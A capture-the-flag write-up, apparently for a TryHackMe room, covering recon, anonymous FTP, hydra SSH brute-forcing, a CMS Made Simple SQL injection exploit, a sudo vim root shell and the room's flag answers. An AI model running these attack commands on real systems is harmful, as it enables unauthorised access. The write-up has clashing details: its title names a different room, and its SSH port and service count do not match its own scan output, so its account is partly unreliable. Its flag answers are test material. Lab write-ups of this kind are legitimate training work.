
---
---

<div align="center">

# TryHackMe Agent Sudo


<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/aedc6b66c222e15ff740c282a0c3f44e.png" alt="THM AgentSudo" width="220px" height="220px" style="margin-right: 85px;">
<img src="https://assets.tryhackme.com/img/THMlogo.png" alt="THM Logo" width="250px" height="150px" style="margin-bottom: 50px;">

<br>

🔗 [Click here to access the TryHackMe room](https://tryhackme.com/room/agentsudoctf)

<br>

</div>


## IP Addresses:

* ### Target/Victim Machine

	> export IP=10.10.243.207

	```
	10.10.243.207 ()
	```

* ### Attacker Machine

	```
	10.17.35.235 (Ubuntu 23.10)
	```


<br>

## Reconnaissance:

* ### Nmap Scan

	> nmap -sV $IP -o logs/nmap.log

	```
	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     vsftpd 3.0.3
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	```

* ### Gobuster Scan

	> gobuster dir -u $IP -w ~/tools/wordlists/dirb/common.txt -o gobuster.log

	```
	/.hta                 (Status: 403) [Size: 292]
	/.htpasswd            (Status: 403) [Size: 297]
	/.htaccess            (Status: 403) [Size: 297]
	/index.html           (Status: 200) [Size: 11321]
	/robots.txt           (Status: 200) [Size: 929]
	/server-status        (Status: 403) [Size: 301]
	/simple               (Status: 301) [Size: 315]
	```


<br>

## Exploring $IP/simple:

Content Management System - `CMS Made Simple` running with version `2.2.8`.

Found CVE `(CVE-2019-9053)` for this version on [Exploit-DB](https://www.exploit-db.com/exploits/46635) vulnerable to `SQL Injection`.


<br>

## THM Questions:

* _Q1_: How many services are running under port 1000? <br> _A_: `2`
* _Q2_: What is running on the higher port? <br> _A_: `ssh`
* _03_: What's the CVE you're using against the application? <br> _A_: `CVE-2019-9053`
* _04_: To what kind of vulnerability is the application vulnerable? <br> _A_: `SQLi`


<br>

## Attempting FTP login:

* ### FTP Login

	> ftp $IP

	Login successful via user `anonymous`!

* ### Exploring directory listings

	> ls

	```
	drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
	```

	> cd pub
	
	> ls

	```
	-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
	```

	> get ForMitch.txt

	Now, on local shell

	> cat ForMitch.txt

	```
	Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
	```

	Possible username `Mitch` found.

## Attempting SSH login:

* ### SSH Login (user: mitch)

	> ssh -p 2222 mitch@$IP

	Login unsuccessful! Password protected.

* ### Using `hydra` to bruteforce SSH

	> hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://$IP:2222/ | tee hydra.log

	```
	[2222][ssh] host: 10.10.216.127   login: mitch   password: secret
	```

	Password found!

* ### SSH Login (user/pass: mitch/secret)

	> ssh -p 2222 mitch@$IP

	Login successful! Shell obtained.


<br>

## Alternate approach (`exploit-db`):

We can find the username and password using exploit-db's SQL Injection script.

* ### Finding the exploit

	> searchsploit --cve 2019-9053

	```
	----------------------------------------------------- ---------------------
 	Exploit Title                                        |  Path
	----------------------------------------------------- --------------------- 
	CMS Made Simple < 2.2.10 - SQL Injection             | php/webapps/46635.py
	----------------------------------------------------- --------------------- 
	Shellcodes: No Results
	```

	Copying the script to the current directory

	> searchsploit -m php/webapps/46635.py

	The exploit can also be downloaded from the [Exploit-DB](https://www.exploit-db.com/exploits/46635) website.

* ### Execution

	> python 46635.py -u http://$IP/simple/ --crack -w /usr/share/wordlists/rockyou.txt

	```
	[+] Salt for password found: 1dac0d92e9fa6bb2
	[+] Username found: mitch
	[+] Email found: admin@admin.com
	[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
	[+] Password cracked: secret
	```
	
**NOTE** - The exploit from exploit-db has gotten relatively old and hence this approach requires a loadfull of environment setup such as the explicit need of Python2 (most modern linux operating systems come with Python3 and doesn't allow a direct installation od Python2 as it is deprecated), pip2, and hence all other dependencies of Python2 and pip2. Also, this exploit takes comparatively more time in grabbing the username and password, whereas the initial approach does it in seconds (as the username can be guessed easily).


<br>

## Exploring current shell and file system:

* ### Executing commands

	> ls -l

	```
	-rw-rw-r-- 1 mitch mitch 19 aug 17  2019 user.txt
	```

	User flag found! Copying over to local machine.

	> scp -P 2222 mitch@$IP:~/user.txt .

	> cd /home && ls -la

	```
	drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
	drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
	```


<br>

## User flag:

> cat user.txt

```
G00d j0b, keep up!
```


<br>

## THM Questions:

* _Q5_: What's the password? <br> _A_: `secret`
* _Q6_: Where can you login with the details obtained? <br> _A_: `ssh`
* _06_: What's the user flag? <br> _A_: `G00d j0b, keep up!`
* _07_: Is there any other user in the home directory? What's its name? <br> _A_: `sunbath`



<br>

## Attempting privilege escalation:

* ### Finding `sudo` privileges

	> sudo -l

	```
	User mitch may run the following commands on Machine:
    	(root) NOPASSWD: /usr/bin/vim
	```

* ### Using `vim` to spawn a privileged shell

	> sudo vim

	> :sh

	> whoami

	```
	root
	```

	Root shell obtained successfully!


<br>

## Root flag:

> cd /root

> ls -l

```
-rw-r--r-- 1 root root 24 aug 17  2019 root.txt
```

> cat root.txt

```
W3ll d0n3. You made it!
```


<br>

## THM Questions:

* _Q8_: What can you leverage to spawn a privileged shell? <br> _A_: `vim`
* _Q9_: What's the root flag? <br> _A_: `W3ll d0n3. You made it!`


<br>

---
---

<div align="center">

💻 Created by [Jayaditya Dev](https://tryhackme.com/p/jayadityadev)

🚀 Find me on [GitHub](https://github.com/jayadityadev)

</div>

---
---